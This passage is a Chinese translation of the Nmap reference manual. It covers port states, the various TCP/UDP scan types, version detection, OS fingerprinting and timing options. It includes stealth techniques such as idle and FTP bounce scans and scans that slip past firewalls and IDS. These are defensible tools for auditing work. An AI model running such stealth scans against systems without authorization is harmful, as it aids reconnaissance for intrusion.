当Nmap试图发送一个原始IP报文如ICMP回声请求时， 操作系统必须确定对应于目标IP的硬件地址(ARP)，这样它才能把以太帧送往正确的地址。 这一般比较慢而且会有些问题，因为操作系统设计者认为一般不会在短时间内 对没有运行的机器作几百万次的ARP请求。</p><p>当进行ARP扫描时，Nmap用它优化的算法管理ARP请求。当它收到响应时，Nmap甚至不需要担心基于IP的ping报文，既然它已经知道该主机正在运行了。 这使得ARP扫描比基于IP的扫描更快更可靠。 所以默认情况下，如果Nmap发现目标主机就在它所在的局域网上，它会进行ARP扫描。即使指定了不同的ping类型(如 -PI或者 -PS) ，Nmap也会对任何相同局域网上的目标机使用ARP。 如果您真的不想要ARP扫描，指定 –send-ip。</p><p><strong>-n (不用域名解析)</strong></p><p>告诉Nmap 永不对它发现的活动IP地址进行反向域名解析。既然DNS一般比较慢，这可以让事情更快些。</p><p><strong>-R (为所有目标解析域名)</strong></p><p>告诉Nmap 永远 对目标IP地址作反向域名解析。 一般只有当发现机器正在运行时才进行这项操作。</p><p><strong>–system-dns (使用系统域名解析器)</strong></p><p>默认情况下，Nmap通过直接发送查询到您的主机上配置的域名服务器 来解析域名。为了提高性能，许多请求 (一般几十个 ) 并发执行。如果您希望使用系统自带的解析器，就指定该选项 (通过getnameinfo()调用一次解析一个IP)。除非Nmap的DNS代码有bug–如果是这样，请联系我们。 一般不使用该选项，因为它慢多了。系统解析器总是用于IPv6扫描。</p><h1 id="端口扫描基础"><a href="#端口扫描基础" class="headerlink" title="端口扫描基础"></a>端口扫描基础</h1><p>虽然Nmap这些年来功能越来越多， 它也是从一个高效的端口扫描器开始的，并且那仍然是它的核心功能。 nmap<target>这个简单的命令扫描主机<target>上的超过 1660个TCP端口。 。许多传统的端口扫描器只列出所有端口是开放还是关闭的， Nmap的信息粒度比它们要细得多。 它把端口分成六个状态: open(开放的)， closed(关闭的)，filtered(被过滤的)， unfiltered(未被过滤的)， open|filtered(开放或者被过滤的)，或者 closed|filtered(关闭或者被过滤的)。</target></target></p><p>这些状态并非端口本身的性质，而是描述Nmap怎样看待它们。例如， 对于同样的目标机器的135/tcp端口，从同网络扫描显示它是开放的，而跨网络作完全相同的扫描则可能显示它是 filtered(被过滤的)。</p><p>Nmap所识别的6个端口状态：</p><p><strong>open(开放的)</strong></p><p>应用程序正在该端口接收TCP 连接或者UDP报文。发现这一点常常是端口扫描 的主要目标。安全意识强的人们知道每个开放的端口 都是攻击的入口。攻击者或者入侵测试者想要发现开放的端口。 而管理员则试图关闭它们或者用防火墙保护它们以免妨碍了合法用户。 非安全扫描可能对开放的端口也感兴趣，因为它们显示了网络上那些服务可供使用。</p><p><strong>closed(关闭的)</strong></p><p>关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听。 它们可以显示该IP地址上(主机发现，或者ping扫描)的主机正在运行up 也对部分操作系统探测有所帮助。 因为关闭的关口是可访问的，也许过会儿值得再扫描一下，可能一些又开放了。 系统管理员可能会考虑用防火墙封锁这样的端口。 那样他们就会被显示为被过滤的状态，下面讨论。</p><p><strong>filtered(被过滤的)</strong></p><p>由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由器规则 或者主机上的软件防火墙。这样的端口让攻击者感觉很挫折，因为它们几乎不提供 任何信息。有时候它们响应ICMP错误消息如类型3代码13 (无法到达目标: 通信被管理员禁止)，但更普遍的是过滤器只是丢弃探测帧， 不做任何响应。 这迫使Nmap重试若干次以访万一探测包是由于网络阻塞丢弃的。 这使得扫描速度明显变慢。</p><p><strong>unfiltered(未被过滤的)</strong></p><p>未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。 只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。 用其它类型的扫描如窗口扫描，SYN扫描，或者FIN扫描来扫描未被过滤的端口可以帮助确定 端口是否开放。</p><p><strong>open|filtered(开放或者被过滤的)</strong></p><p>当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成 这种状态。开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃 了探测报文或者它引发的任何响应。因此Nmap无法确定该端口是开放的还是被过滤的。 UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类。</p><p><strong>closed|filtered(关闭或者被过滤的)</strong></p><p>该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中。</p><h1 id="端口扫描技术"><a href="#端口扫描技术" class="headerlink" title="端口扫描技术"></a>端口扫描技术</h1><p>作为一个修车新手，我可能折腾几个小时来摸索怎样把基本工具(锤子，胶带，扳子等) 用于手头的任务。当我惨痛地失败，把我的老爷车拖到一个真正的技师那儿的时候 ，他总是在他的工具箱里翻来翻去，直到拽出一个完美的工具然后似乎不费吹灰之力搞定它。 端口扫描的艺术和这个类似。专家理解成打的扫描技术，选择最适合的一种 (或者组合)来完成给定的 任务。 另一方面，没有经验的用户和刚入门者总是用默认的SYN扫描解决每个问题。 既然Nmap是免费的，掌握端口扫描的唯一障碍就是知识。这当然是汽车世界所不能比的， 在那里，可能需要高超的技巧才能确定您需要一个压杆弹簧压缩机，接着您还得为它付数千美金。</p><p>大部分扫描类型只对特权用户可用。 这是因为他们发送接收原始报文，这在Unix系统需要root权限。 在Windows上推荐使用administrator账户，但是当WinPcap已经被加载到操作系统时， 非特权用户也可以正常使用Nmap。当Nmap在1997年发布时，需要root权限是一个严重的 局限，因为很多用户只有共享的shell账户。现在，世界变了，计算机便宜了，更多人拥有互联网连接 ，桌面UNIX系统 (包括Linux和MAC OS X)很普遍了。Windows版本的Nmap现在也有了，这使它可以运行在更多的桌面上。 由于所有这些原因，用户不再需要用有限的共享shell账户运行Nmap。 这是很幸运的，因为特权选项让Nmap强大得多也灵活得多。</p><p>虽然Nmap努力产生正确的结果，但请记住所有结果都是基于目标机器(或者它们前面的防火墙)返回的报文的。 。这些主机也许是不值得信任的，它们可能响应以迷惑或误导Nmap的报文。 更普遍的是非RFC兼容的主机以不正确的方式响应Nmap探测。FIN，Null和Xmas扫描 特别容易遇到这个问题。这些是特定扫描类型的问题，因此我们在个别扫描类型里讨论它们。</p><p>这一节讨论Nmap支持的大约十几种扫描技术。 一般一次只用一种方法， 除了UDP扫描(-sU)可能和任何一种TCP扫描类型结合使用。 友情提示一下，端口扫描类型的选项格式是-s<c>， 其中<c>是个显眼的字符，通常是第一个字符。 一个例外是deprecated FTP bounce扫描(-b)。默认情况下，Nmap执行一个 SYN扫描，但是如果用户没有权限发送原始报文(在UNIX上需要root权限)或者如果指定的是IPv6目标，Nmap调用connect()。 本节列出的扫描中，非特权用户只能执行connect()和ftp bounce扫描。</c></c></p><p><strong>-sS (TCP SYN扫描)</strong></p><p>SYN扫描作为默认的也是最受欢迎的扫描选项，是有充分理由的。 它执行得很快，在一个没有入侵防火墙的快速网络上，每秒钟可以扫描数千个 端口。 SYN扫描相对来说不张扬，不易被注意到，因为它从来不完成TCP连接。 它也不像Fin/Null/Xmas，Maimon和Idle扫描依赖于特定平台，而可以应对任何兼容的 TCP协议栈。 它还可以明确可靠地区分open(开放的)， closed(关闭的)，和filtered(被过滤的) 状态</p><p>它常常被称为半开放扫描， 因为它不打开一个完全的TCP连接。它发送一个SYN报文， 就像您真的要打开一个连接，然后等待响应。 SYN/ACK表示端口在监听 (开放)，而 RST (复位)表示没有监听者。如果数次重发后仍没响应， 该端口就被标记为被过滤。如果收到ICMP不可到达错误 (类型3，代码1，2，3，9，10，或者13)，该端口也被标记为被过滤。</p><p><strong>-sT (TCP connect()扫描)</strong></p><p>当SYN扫描不能用时，CP Connect()扫描就是默认的TCP扫描。 当用户没有权限发送原始报文或者扫描IPv6网络时，就是这种情况。 Instead of writing raw packets as most other scan types do，Nmap通过创建connect() 系统调用要求操作系统和目标机以及端口建立连接，而不像其它扫描类型直接发送原始报文。 这是和Web浏览器，P2P客户端以及大多数其它网络应用程序用以建立连接一样的 高层系统调用。它是叫做Berkeley Sockets API编程接口的一部分。Nmap用 该API获得每个连接尝试的状态信息，而不是读取响应的原始报文。</p><p>当SYN扫描可用时，它通常是更好的选择。因为Nmap对高层的 connect()调用比对原始报文控制更少， 所以前者效率较低。 该系统调用完全连接到开放的目标端口而不是像SYN扫描进行 半开放的复位。这不仅花更长时间，需要更多报文得到同样信息，目标机也更可能 记录下连接。IDS(入侵检测系统)可以捕获两者，但大部分机器没有这样的警报系统。 当Nmap连接，然后不发送数据又关闭连接， 许多普通UNIX系统上的服务会在syslog留下记录，有时候是一条加密的错误消息。 此时，有些真正可怜的服务会崩溃，虽然这不常发生。如果管理员在日志里看到来自同一系统的 一堆连接尝试，她应该知道她的系统被扫描了。</p><p>-<strong>sU (UDP扫描)</strong></p><p>虽然互联网上很多流行的服务运行在TCP 协议上，<a href="http://www.rfc-editor.org/rfc/rfc768.txt" target="_blank" rel="external">UDP服务</a>也不少。 DNS，SNMP，和DHCP (注册的端口是53，161/162，和67/68)是最常见的三个。 因为UDP扫描一般较慢，比TCP更困难，一些安全审核人员忽略这些端口。 这是一个错误，因为可探测的UDP服务相当普遍，攻击者当然不会忽略整个协议。 所幸，Nmap可以帮助记录并报告UDP端口。</p><p>UDP扫描用-sU选项激活。它可以和TCP扫描如 SYN扫描 (-sS)结合使用来同时检查两种协议。</p><p>UDP扫描发送空的(没有数据)UDP报头到每个目标端口。 如果返回ICMP端口不可到达错误(类型3，代码3)， 该端口是closed(关闭的)。 其它ICMP不可到达错误(类型3， 代码1，2，9，10，或者13)表明该端口是filtered(被过滤的)。 偶尔地，某服务会响应一个UDP报文，证明该端口是open(开放的)。 如果几次重试后还没有响应，该端口就被认为是 open|filtered(开放|被过滤的)。 这意味着该端口可能是开放的，也可能包过滤器正在封锁通信。 可以用版本扫描(-sV)帮助区分真正的开放端口和被过滤的端口。</p><p>UDP扫描的巨大挑战是怎样使它更快速。 开放的和被过滤的端口很少响应，让Nmap超时然后再探测，以防探测帧或者 响应丢失。关闭的端口常常是更大的问题。 它们一般发回一个ICMP端口无法到达错误。但是不像关闭的TCP端口响应SYN或者Connect 扫描所发送的RST报文，许多主机在默认情况下限制ICMP端口不可到达消息。 Linux和Solaris对此特别严格。例如， Linux 2.4.20内核限制一秒钟只发送一条目标不可到达消息 (见net/ipv4/icmp。c)。</p><p>Nmap探测速率限制并相应地减慢来避免用那些目标机会丢弃的无用报文来阻塞 网络。不幸的是，Linux式的一秒钟一个报文的限制使65,536个端口的扫描要花 18小时以上。加速UDP扫描的方法包括并发扫描更多的主机，先只对主要端口进行快速 扫描，从防火墙后面扫描，使用–host-timeout跳过慢速的 主机。</p><p><strong>-sN; -sF; -sX (TCP Null，FIN，and Xmas扫描)</strong></p><p>这三种扫描类型 (甚至用下一节描述的 –scanflags 选项的更多类型) 在<a href="http://www.rfc-editor.org/rfc/rfc793.txt" target="_blank" rel="external">TCP RFC</a>中发掘了一个微妙的方法来区分open(开放的)和 closed(关闭的)端口。第65页说“如果 [目标]端口状态是关闭的…. 进入的不含RST的报文导致一个RST响应。” 接下来的一页 讨论不设置SYN，RST，或者ACK位的报文发送到开放端口: “理论上，这不应该发生，如果您确实收到了，丢弃该报文，返回。 ”</p><p>如果扫描系统遵循该RFC，当端口关闭时，任何不包含SYN，RST，或者ACK位的报文会导致 一个RST返回，而当端口开放时，应该没有任何响应。只要不包含SYN，RST，或者ACK， 任何其它三种(FIN，PSH，and URG)的组合都行。Nmap有三种扫描类型利用这一点：</p><p><strong>Null扫描 (-sN)</strong></p><p>不设置任何标志位(tcp标志头是0)</p><p><strong>FIN扫描 (-sF)</strong></p><p>只设置TCP FIN标志位。</p><p><strong>Xmas扫描 (-sX)</strong></p><p>设置FIN，PSH，和URG标志位，就像点亮圣诞树上所有的灯一样。</p><p>除了探测报文的标志位不同，这三种扫描在行为上完全一致。 如果收到一个RST报文，该端口被认为是 closed(关闭的)，而没有响应则意味着 端口是open|filtered(开放或者被过滤的)。 如果收到ICMP不可到达错误(类型 3，代号 1，2，3，9，10，或者13)，该端口就被标记为 被过滤的。</p><p>这些扫描的关键优势是它们能躲过一些无状态防火墙和报文过滤路由器。 另一个优势是这些扫描类型甚至比SYN扫描还要隐秘一些。但是别依赖它 – 多数 现代的IDS产品可以发现它们。一个很大的不足是并非所有系统都严格遵循RFC 793。 许多系统不管端口开放还是关闭，都响应RST。 这导致所有端口都标记为closed(关闭的)。 这样的操作系统主要有Microsoft Windows，许多Cisco设备，BSDI，以及IBM OS/400。 但是这种扫描对多数UNIX系统都能工作。这些扫描的另一个不足是 它们不能辨别open(开放的)端口和一些特定的 filtered(被过滤的)端口，从而返回 open|filtered(开放或者被过滤的)。</p><p><strong>-sA (TCP ACK扫描)</strong></p><p>这种扫描与目前为止讨论的其它扫描的不同之处在于 它不能确定open(开放的)或者 open|filtered(开放或者过滤的))端口。 它用于发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的。</p><p>ACK扫描探测报文只设置ACK标志位(除非您使用 –scanflags)。当扫描未被过滤的系统时， open(开放的)和closed(关闭的) 端口 都会返回RST报文。Nmap把它们标记为 unfiltered(未被过滤的)，意思是 ACK报文不能到达，但至于它们是open(开放的)或者 closed(关闭的) 无法确定。不响应的端口 或者发送特定的ICMP错误消息(类型3，代号1，2，3，9，10， 或者13)的端口，标记为 filtered(被过滤的)。</p><p><strong>-sW (TCP窗口扫描)</strong></p><p>除了利用特定系统的实现细节来区分开放端口和关闭端口，当收到RST时不总是打印unfiltered， 窗口扫描和ACK扫描完全一样。 它通过检查返回的RST报文的TCP窗口域做到这一点。 在某些系统上，开放端口用正数表示窗口大小(甚至对于RST报文) 而关闭端口的窗口大小为0。因此，当收到RST时，窗口扫描不总是把端口标记为 unfiltered， 而是根据TCP窗口值是正数还是0，分别把端口标记为open或者 closed</p><p>该扫描依赖于互联网上少数系统的实现细节， 因此您不能永远相信它。不支持它的系统会通常返回所有端口closed。 当然，一台机器没有开放端口也是有可能的。 如果大部分被扫描的端口是 closed，而一些常见的端口 (如 22， 25，53) 是 filtered，该系统就非常可疑了。 偶尔地，系统甚至会显示恰恰相反的行为。 如果您的扫描显示1000个开放的端口和3个关闭的或者被过滤的端口， 那么那3个很可能也是开放的端口。</p><p><strong>-sM (TCP Maimon扫描)</strong></p><p>Maimon扫描是用它的发现者Uriel Maimon命名的。他在 Phrack Magazine issue #49 (November 1996)中描述了这一技术。 Nmap在两期后加入了这一技术。 这项技术和Null，FIN，以及Xmas扫描完全一样，除了探测报文是FIN/ACK。 根据RFC 793 (TCP)，无论端口开放或者关闭，都应该对这样的探测响应RST报文。 然而，Uriel注意到如果端口开放，许多基于BSD的系统只是丢弃该探测报文。</p><p><strong>–scanflags (定制的TCP扫描)</strong></p><p>真正的Nmap高级用户不需要被这些现成的扫描类型束缚。 –scanflags选项允许您通过指定任意TCP标志位来设计您自己的扫描。 让您的创造力流动，躲开那些仅靠本手册添加规则的入侵检测系统！</p><p>–scanflags选项可以是一个数字标记值如9 (PSH和FIN)， 但使用字符名更容易些。 只要是URG， ACK，PSH， RST，SYN，and FIN的任何组合就行。例如，–scanflags URGACKPSHRSTSYNFIN设置了所有标志位，但是这对扫描没有太大用处。 标志位的顺序不重要。</p><p>除了设置需要的标志位，您也可以设置 TCP扫描类型(如-sA或者-sF)。 那个基本类型告诉Nmap怎样解释响应。例如， SYN扫描认为没有响应意味着 filtered端口，而FIN扫描则认为是 open|filtered。 除了使用您指定的TCP标记位，Nmap会和基本扫描类型一样工作。 如果您不指定基本类型，就使用SYN扫描。</p><p><strong>-sI<zombie host[:probeport]="">(Idlescan)</zombie></strong></p><p>这种高级的扫描方法允许对目标进行真正的TCP端口盲扫描 (意味着没有报文从您的真实IP地址发送到目标)。相反，side-channel攻击 利用zombie主机上已知的IP分段ID序列生成算法来窥探目标上开放端口的信息。 IDS系统将显示扫描来自您指定的zombie机(必须运行并且符合一定的标准)。 这种奇妙的扫描类型太复杂了，不能在此完全描述，所以我写一篇非正式的论文， 发布在<a href="https://nmap.org/book/idlescan.html" target="_blank" rel="external">https://nmap.org/book/idlescan.html</a>。</p><p>除了极端隐蔽(由于它不从真实IP地址发送任何报文)， 该扫描类型可以建立机器间的基于IP的信任关系。 端口列表从zombie 主机的角度。显示开放的端口。 因此您可以尝试用您认为(通过路由器/包过滤规则)可能被信任的 zombies扫描目标。</p><p>如果您由于IPID改变希望探测zombie上的特定端口， 您可以在zombie 主机后加上一个冒号和端口号。 否则Nmap会使用默认端口(80)。</p><p><strong>-sO (IP协议扫描)</strong></p><p>IP 协议扫描可以让您确定目标机支持哪些IP协议 (TCP，ICMP，IGMP，等等)。从技术上说，这不是端口扫描 ，既然它遍历的是IP协议号而不是TCP或者UDP端口号。 但是它仍使用 -p选项选择要扫描的协议号， 用正常的端口表格式报告结果，甚至用和真正的端口扫描一样 的扫描引擎。因此它和端口扫描非常接近，也被放在这里讨论。</p><p>除了本身很有用，协议扫描还显示了开源软件的力量。 尽管基本想法非常简单，我过去从没想过增加这一功能也没收到任何对它的请求。 在2000年夏天，Gerhard Rieger孕育了这个想法，写了一个很棒的补丁程序，发送到nmap-hackers邮件列表。 我把那个补丁加入了Nmap，第二天发布了新版本。 几乎没有商业软件会有用户有足够的热情设计并贡献他们的改进。</p><p>协议扫描以和UDP扫描类似的方式工作。它不是在UDP报文的端口域上循环， 而是在IP协议域的8位上循环，发送IP报文头。 报文头通常是空的，不包含数据，甚至不包含所申明的协议的正确报文头 TCP，UDP，和ICMP是三个例外。它们三个会使用正常的协议头，因为否则某些系 统拒绝发送，而且Nmap有函数创建它们。协议扫描不是注意ICMP端口不可到达消息， 而是ICMP 协议不可到达消息。如果Nmap从目标主机收到 任何协议的任何响应，Nmap就把那个协议标记为open。 ICMP协议不可到达 错误(类型 3，代号 2) 导致协议被标记为 closed。其它ICMP不可到达协议(类型 3，代号 1，3，9，10，或者13) 导致协议被标记为 filtered (虽然同时他们证明ICMP是 open )。如果重试之后仍没有收到响应， 该协议就被标记为open|filtered</p><p><strong>-b<ftp relay="" host="">(FTP弹跳扫描)</ftp></strong></p><p>FTP协议的一个有趣特征(<a href="http://www.rfc-editor.org/rfc/rfc959.txt" target="_blank" rel="external">RFC 959</a>) 是支持所谓代理ftp连接。它允许用户连接到一台FTP服务器，然后要求文件送到一台第三方服务器。 这个特性在很多层次上被滥用，所以许多服务器已经停止支持它了。其中一种就是导致FTP服务器对其它主机端口扫描。 只要请求FTP服务器轮流发送一个文件到目标主机上的所感兴趣的端口。 错误消息会描述端口是开放还是关闭的。 这是绕过防火墙的好方法，因为FTP服务器常常被置于可以访问比Web主机更多其它内部主机的位置。 Nmap用-b选项支持ftp弹跳扫描。参数格式是<username>:<password>@<server>:<port>。<server>是某个脆弱的FTP服务器的名字或者IP地址。 您也许可以省略<username>:<password>， 如果服务器上开放了匿名用户(user:anonymous password:-wwwuser@)。 端口号(以及前面的冒号) 也可以省略，如果<server>使用默认的FTP端口(21)。</server></password></username></server></port></server></password></username></p><p>当Nmap1997年发布时，这个弱点被广泛利用，但现在大部分已经被fix了。 脆弱的服务器仍然存在，所以如果其它都失败了，这也值得一试。 如果您的目标是绕过防火墙，扫描目标网络上的开放的21端口(或者 甚至任何ftp服务，如果您用版本探测扫描所有端口)， 然后对每个尝试弹跳扫描。Nmap会告诉您该主机脆弱与否。 如果您只是试着玩Nmap，您不必(事实上，不应该)限制您自己。 在您随机地在互联网上寻找脆弱的FTP服务器时，考虑一下系统管理员不太喜欢您这样滥用他们的服务器。</p><h1 id="端口说明和扫描顺序"><a href="#端口说明和扫描顺序" class="headerlink" title="端口说明和扫描顺序"></a>端口说明和扫描顺序</h1><p>除了所有前面讨论的扫描方法， Nmap提供选项说明那些端口被扫描以及扫描是随机还是顺序进行。 默认情况下，Nmap用指定的协议对端口1到1024以及nmap-services 文件中列出的更高的端口在扫描。</p><p><strong>-p<port ranges="">(只扫描指定的端口)</port></strong></p><p>该选项指明您想扫描的端口，覆盖默认值。 单个端口和用连字符表示的端口范围(如 1-1023)都可以。 范围的开始以及/或者结束值可以被省略， 分别导致Nmap使用1和65535。所以您可以指定 -p-从端口1扫描到65535。 如果您特别指定，也可以扫描端口0。 对于IP协议扫描(-sO)，该选项指定您希望扫描的协议号 (0-255)。</p><p>当既扫描TCP端口又扫描UDP端口时，您可以通过在端口号前加上T: 或者U:指定协议。 协议限定符一直有效您直到指定另一个。 例如，参数 -p U:53，111，137，T:21-25，80，139，8080 将扫描UDP 端口53，111，和137，同时扫描列出的TCP端口。注意，要既扫描 UDP又扫描TCP，您必须指定 -sU ，以及至少一个TCP扫描类型(如 -sS，-sF，或者 -sT)。如果没有给定协议限定符， 端口号会被加到所有协议列表。</p><p><strong>-F (快速 (有限的端口) 扫描)</strong></p><p>在nmap的nmap-services 文件中(对于-sO，是协议文件)指定您想要扫描的端口。 这比扫描所有65535个端口快得多。 因为该列表包含如此多的TCP端口(1200多)，这和默认的TCP扫描 scan (大约1600个端口)速度差别不是很大。如果您用–datadir选项指定您自己的 小小的nmap-services文件 ，差别会很惊人。</p><p><strong>-r (不要按随机顺序扫描端口)</strong></p><p>默认情况下，Nmap按随机顺序扫描端口 (除了出于效率的考虑，常用的端口前移)。这种随机化通常都是受欢迎的， 但您也可以指定-r来顺序端口扫描。</p><h1 id="服务和版本探测"><a href="#服务和版本探测" class="headerlink" title="服务和版本探测"></a>服务和版本探测</h1><p>把Nmap指向一个远程机器，它可能告诉您 端口25/tcp，80/tcp，和53/udp是开放的。使用包含大约2,200个著名的服务的 nmap-services数据库， Nmap可以报告那些端口可能分别对应于一个邮件服务器 (SMTP)，web服务器(HTTP)，和域名服务器(DNS)。 这种查询通常是正确的 – 事实上，绝大多数在TCP端口25监听的守护进程是邮件 服务器。然而，您不应该把赌注押在这上面! 人们完全可以在一些奇怪的端口上运行服务。</p><p>即使Nmap是对的，假设运行服务的确实是 SMTP，HTTP和DNS，那也不是特别多的信息。 当为您的公司或者客户作安全评估(或者甚至简单的网络明细清单)时， 您确实想知道正在运行什么邮件和域名服务器以及它们的版本。 有一个精确的版本号对了解服务器有什么漏洞有巨大帮助。 版本探测可以帮您获得该信息。</p><p>在用某种其它类型的扫描方法发现TCP 和/或者UDP端口后， 版本探测会询问这些端口，确定到底什么服务正在运行。 nmap-service-probes 数据库包含查询不同服务的探测报文 和解析识别响应的匹配表达式。 Nmap试图确定服务协议 (如 ftp，ssh，telnet，http)，应用程序名(如ISC Bind，Apache httpd，Solaris telnetd)，版本号， 主机名，设备类型(如 打印机，路由器)，操作系统家族 (如Windows，Linux)以及其它的细节，如 如是否可以连接X server，SSH协议版本 ，或者KaZaA用户名)。当然，并非所有服务都提供所有这些信息。 如果Nmap被编译成支持OpenSSL， 它将连接到SSL服务器，推测什么服务在加密层后面监听。 当发现RPC服务时， Nmap RPC grinder (-sR)会自动被用于确定RPC程序和它的版本号。 如果在扫描某个UDP端口后仍然无法确定该端口是开放的还是被过滤的，那么该端口状态就 被标记为open|filtered。 版本探测将试图从这些端口引发一个响应(就像它对开放端口做的一样)， 如果成功，就把状态改为开放。 open|filtered TCP端口用同样的方法对待。 注意Nmap -A选项在其它情况下打开版本探测。 有一篇关于版本探测的原理，使用和定制的文章在<a href="http://www.insecure.org/nmap/vscan/" target="_blank" rel="external">http://www.insecure.org/nmap/vscan/</a>。</p><p>当Nmap从某个服务收到响应，但不能在数据库中找到匹配时， 它就打印一个特殊的fingerprint和一个URL给您提交，如果您确实知道什么服务运行在端口。 请花两分钟提交您的发现，让每个人受益。由于这些提交， Nmap有350种以上协议如smtp，ftp，http等的大约3，000条模式匹配。</p><p>用下列的选项打开和控制版本探测：</p><p><strong>-sV (版本探测)</strong></p><p>打开版本探测。 您也可以用-A同时打开操作系统探测和版本探测。</p><p><strong>–allports (不为版本探测排除任何端口)</strong></p><p>默认情况下，Nmap版本探测会跳过9100 TCP端口，因为一些打印机简单地打印送到该端口的 任何数据，这回导致数十页HTTP get请求，二进制 SSL会话请求等等被打印出来。这一行为可以通过修改或删除nmap-service-probes 中的Exclude指示符改变， 您也可以不理会任何Exclude指示符，指定–allports扫描所有端口</p><p><strong>–version-intensity<intensity>(设置 版本扫描强度)</intensity></strong></p><p>当进行版本扫描(-sV)时，nmap发送一系列探测报文 ，每个报文都被赋予一个1到9之间的值。 被赋予较低值的探测报文对大范围的常见服务有效，而被赋予较高值的报文 一般没什么用。强度水平说明了应该使用哪些探测报文。数值越高， 服务越有可能被正确识别。 然而，高强度扫描花更多时间。强度值必须在0和9之间。 默认是7。当探测报文通过nmap-service-probes ports指示符 注册到目标端口时，无论什么强度水平，探测报文都会被尝试。这保证了DNS 探测将永远在任何开放的53端口尝试， SSL探测将在443端口尝试，等等。</p><p><strong>–version-light (打开轻量级模式)</strong></p><p>这是 –version-intensity 2的方便的别名。轻量级模式使 版本扫描快许多，但它识别服务的可能性也略微小一点。</p><p><strong>–version-all (尝试每个探测)</strong></p><p>–version-intensity 9的别名， 保证对每个端口尝试每个探测报文。</p><p><strong>–version-trace (跟踪版本扫描活动)</strong></p><p>这导致Nmap打印出详细的关于正在进行的扫描的调试信息。 它是您用–packet-trace所得到的信息的子集。</p><p><strong>-sR (RPC扫描)</strong></p><p>这种方法和许多端口扫描方法联合使用。 它对所有被发现开放的TCP/UDP端口执行SunRPC程序NULL命令，来试图 确定它们是否RPC端口，如果是， 是什么程序和版本号。因此您可以有效地获得和<strong>rpcinfo -p</strong>一样的信息， 即使目标的端口映射在防火墙后面(或者被TCP包装器保护)。Decoys目前不能和RPC scan一起工作。 这作为版本扫描(-sV)的一部分自动打开。 由于版本探测包括它并且全面得多，-sR很少被需要。</p><h1 id="操作系统探测"><a href="#操作系统探测" class="headerlink" title="操作系统探测"></a>操作系统探测</h1><p>Nmap最著名的功能之一是用TCP/IP协议栈fingerprinting进行远程操作系统探测。 Nmap发送一系列TCP和UDP报文到远程主机，检查响应中的每一个比特。 在进行一打测试如TCP ISN采样，TCP选项支持和排序，IPID采样，和初始窗口大小检查之后， Nmap把结果和数据库nmap-os-fingerprints中超过 1500个已知的操作系统的fingerprints进行比较，如果有匹配，就打印出操作系统的详细信息。 每个fingerprint包括一个自由格式的关于OS的描述文本， 和一个分类信息，它提供供应商名称(如Sun)，下面的操作系统(如Solaris)，OS版本(如10)， 和设备类型(通用设备，路由器，switch，游戏控制台， 等)。</p><p>如果Nmap不能猜出操作系统，并且有些好的已知条件(如 至少发现了一个开放端口和一个关闭端口)，Nmap会提供一个 URL，如果您确知运行的操作系统，您可以把fingerprint提交到那个URL。 这样您就扩大了Nmap的操作系统知识库，从而让每个Nmap用户都受益。</p><p>操作系统检测可以进行其它一些测试，这些测试可以利用处理 过程中收集到的信息。例如运行时间检测，使用TCP时间戳选项(RFC 1323) 来估计主机上次重启的时间，这仅适用于提供这类信息的主机。另一种 是TCP序列号预测分类，用于测试针对远程主机建立一个伪造的TCP连接 的可能难度。这对于利用基于源IP地址的可信关系(rlogin，防火墙过滤等) 或者隐含源地址的攻击非常重要。这一类哄骗攻击现在很少见，但一些 主机仍然存在这方面的漏洞。实际的难度值基于统计采样，因此可能会有 一些波动。通常采用英国的分类较好，如“worthy challenge”或者 “trivial joke”。在详细模式(-v)下只以 普通的方式输出，如果同时使用-O，还报告IPID序列产生号。 很多主机的序列号是“增加”类别，即在每个发送包的IP头中 增加ID域值， 这对一些先进的信息收集和哄骗攻击来说是个漏洞。</p><p><a href="https://nmap.org/book/osdetect.html" target="_blank" rel="external">https://nmap.org/book/osdetect.html</a>文档使用多种语言描述了版本检测的方式、使用和定制。</p><p>采用下列选项启用和控制操作系统检测:</p><p><strong>-O (启用操作系统检测)</strong></p><p>也可以使用-A来同时启用操作系统检测和版本检测。</p><p><strong>–osscan-limit (针对指定的目标进行操作系统检测)</strong></p><p>如果发现一个打开和关闭的TCP端口时，操作系统检测会更有效。 采用这个选项，Nmap只对满足这个条件的主机进行操作系统检测，这样可以 节约时间，特别在使用-P0扫描多个主机时。这个选项仅在使用 -O或-A 进行操作系统检测时起作用。</p><p><strong>–osscan-guess; –fuzzy (推测操作系统检测结果)</strong></p><p>当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认 进行这种匹配，使用上述任一个选项使得Nmap的推测更加有效。</p><h1 id="时间和性能"><a href="#时间和性能" class="headerlink" title="时间和性能"></a>时间和性能</h1><p>Nmap开发的最高优先级是性能。在本地网络对一个主机的默认扫描(nmap<hostname>)需要1/5秒。而仅仅眨眼的 时间，就需要扫描上万甚至几十万的主机。此外，一些特定的扫描选项会明显增 加扫描时间，如UDP扫描和版本检测。同样，防火墙配置以及特殊的响应速度限制也会 增加时间。Nmap使用了并行算法和许多先进的算法来加速扫描，用户对Nmap如何 工作有最终的控制权。高级用户可以仔细地调整Nmap命令，在满足时间要求的同时获得他们所关心的信息。</hostname></p><p>改善扫描时间的技术有：忽略非关键的检测、升级最新版本的Nmap(性能增强不断改善)。 优化时间参数也会带来实质性的变化，这些参数如下。</p><p><strong>–min-hostgroup<milliseconds>; –max-hostgroup<milliseconds>(调整并行扫描组的大小)</milliseconds></milliseconds></strong></p><p>Nmap具有并行扫描多主机端口或版本的能力，Nmap将多个目标IP地址 空间分成组，然后在同一时间对一个组进行扫描。通常，大的组更有效。缺 点是只有当整个组扫描结束后才会提供主机的扫描结果。如果组的大小定义 为50，则只有当前50个主机扫描结束后才能得到报告(详细模式中的补充信息 除外)。</p><p>默认方式下，Nmap采取折衷的方法。开始扫描时的组较小， 最小为5，这样便于尽快产生结果；随后增长组的大小，最大为1024。确切的 大小依赖于所给定的选项。为保证效率，针对UDP或少量端口的TCP扫描，Nmap 